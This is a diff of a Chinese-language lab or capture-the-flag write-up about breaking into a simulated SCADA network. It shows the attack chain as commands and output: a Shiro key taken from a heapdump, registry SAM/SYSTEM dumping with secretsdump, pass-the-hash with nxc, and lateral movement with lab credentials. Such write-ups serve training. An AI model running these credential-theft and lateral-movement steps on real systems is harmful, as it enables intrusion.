@@ -30,7 +30,7 @@ tags: [shiro, heapdump, SCADA]
 
 下载 `/actuator/heapdump` 文件并使用 [whwlsfb/JDumpSpider](https://github.com/whwlsfb/JDumpSpider) 分析 heapdump 文件，获取到 Shiro 的 Key：
 
-```
+```console
 root@kali-server:~# java -jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump
 
 ===========================================
@@ -45,7 +45,7 @@ Shiro 反序列化利用：
 
 获取 flag01：
 
-```
+```console
 root@security:~# cat /flag01.txt
    ████  ██                    ████   ██
   ░██░  ░██            █████  █░░░██ ███
@@ -62,7 +62,7 @@ flag01: flag{78cdaa8f-db36-4c9c-b9e9-c1622ff180c4}
 
 获取网段信息：
 
-```
+```console
 root@security:~# ip addr
 1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
     link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
@@ -80,7 +80,7 @@ root@security:~# ip addr
 
 使用 fscan 扫描内网：
 
-```
+```console
 root@security:/# ./fscan -h 172.22.17.213/16 -hn 172.22.17.213
 
    ___                              _
@@ -155,8 +155,8 @@ start vulscan
 
 职位为“SCADA 工程师”的人员账号密码都能 RDP 登录：
 
-```
-PS C:\Users\hony\Desktop> proxychains4 -q nxc smb 172.22.17.6 -u chenhua -p 'chenhua@0813'
+```console
+root@kali-server:~# proxychains4 -q nxc smb 172.22.17.6 -u chenhua -p 'chenhua@0813'
 SMB         172.22.17.6     445    WIN-ENGINEER     [*] Windows 10.0 Build 20348 x64 (name:WIN-ENGINEER) (domain:WIN-ENGINEER) (signing:False) (SMBv1:False)
 SMB         172.22.17.6     445    WIN-ENGINEER     [+] WIN-ENGINEER\chenhua:chenhua@0813
 ```
@@ -167,7 +167,7 @@ SMB         172.22.17.6     445    WIN-ENGINEER     [+] WIN-ENGINEER\chenhua:che
 
 拥有特权：
 
-```
+```console
 PS C:\Windows\system32> whoami
 win-engineer\chenhua
 PS C:\Windows\system32> whoami /priv
@@ -187,7 +187,7 @@ SeIncreaseWorkingSetPrivilege 增加进程工作集 已禁用
 
 转储 sam&system 注册表：
 
-```
+```console
 PS C:\Users\chenhua\Desktop> reg save hklm\sam sam.hive
 操作成功完成。
 PS C:\Users\chenhua\Desktop> reg save hklm\system system.hive
@@ -196,8 +196,8 @@ PS C:\Users\chenhua\Desktop> reg save hklm\system system.hive
 
 使用 impacket-secretsdump 从注册表转储文件中获取 ntlm 哈希：
 
-```
-└─# impacket-secretsdump -sam sam.hive -system system.hive LOCAL
+```console
+root@kali-server:~# impacket-secretsdump -sam sam.hive -system system.hive LOCAL
 Impacket v0.11.0 - Copyright 2023 Fortra
 
 [*] Target system bootKey: 0x6c2be46aaccdf65a9b7be2941d6e7759
@@ -221,12 +221,12 @@ chenhua:1009:aad3b435b51404eeaad3b435b51404ee:07ff24422b538b97f3c297cc8ddc7615::
 
 使用管理员哈希 PTH：
 
-```
-PS C:\Users\hony\Desktop> proxychains4 -q nxc smb 172.22.17.6 -u Administrator -H f82292b7ac79b05d5b0e3d302bd0d279
+```console
+root@kali-server:~# proxychains4 -q nxc smb 172.22.17.6 -u Administrator -H f82292b7ac79b05d5b0e3d302bd0d279
 SMB         172.22.17.6     445    WIN-ENGINEER     [*] Windows 10.0 Build 20348 x64 (name:WIN-ENGINEER) (domain:WIN-ENGINEER) (signing:False) (SMBv1:False)
 SMB         172.22.17.6     445    WIN-ENGINEER     [+] WIN-ENGINEER\Administrator:f82292b7ac79b05d5b0e3d302bd0d279 (Pwn3d!)
 
-PS C:\Users\hony\Desktop> proxychains4 -q nxc smb 172.22.17.6 -u Administrator -H f82292b7ac79b05d5b0e3d302bd0d279 -X 'type ~/flag/flag02.txt'
+root@kali-server:~# proxychains4 -q nxc smb 172.22.17.6 -u Administrator -H f82292b7ac79b05d5b0e3d302bd0d279 -X 'type ~/flag/flag02.txt'
 SMB         172.22.17.6     445    WIN-ENGINEER     [*] Windows 10.0 Build 20348 x64 (name:WIN-ENGINEER) (domain:WIN-ENGINEER) (signing:False) (SMBv1:False)
 SMB         172.22.17.6     445    WIN-ENGINEER     [+] WIN-ENGINEER\Administrator:f82292b7ac79b05d5b0e3d302bd0d279 (Pwn3d!)
 SMB         172.22.17.6     445    WIN-ENGINEER     [+] Executed command via wmiexec
@@ -254,8 +254,8 @@ SMB         172.22.17.6     445    WIN-ENGINEER     flag02: flag{cd0f626c-d89d-4
 
 直接使用管理员凭据进行横向：
 
-```
-PS C:\Users\hony\Desktop> proxychains4 -q nxc smb 172.22.26.0/24 -u Administrator -p IYnT3GyCiy3
+```console
+root@kali-server:~# proxychains4 -q nxc smb 172.22.26.0/24 -u Administrator -p IYnT3GyCiy3
 SMB         172.22.26.11    445    WIN-SCADA        [*] Windows 10.0 Build 20348 x64 (name:WIN-SCADA) (domain:WIN-SCADA) (signing:False) (SMBv1:False)
 SMB         172.22.26.11    445    WIN-SCADA        [+] WIN-SCADA\Administrator:IYnT3GyCiy3 (Pwn3d!)
 Running nxc against 256 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
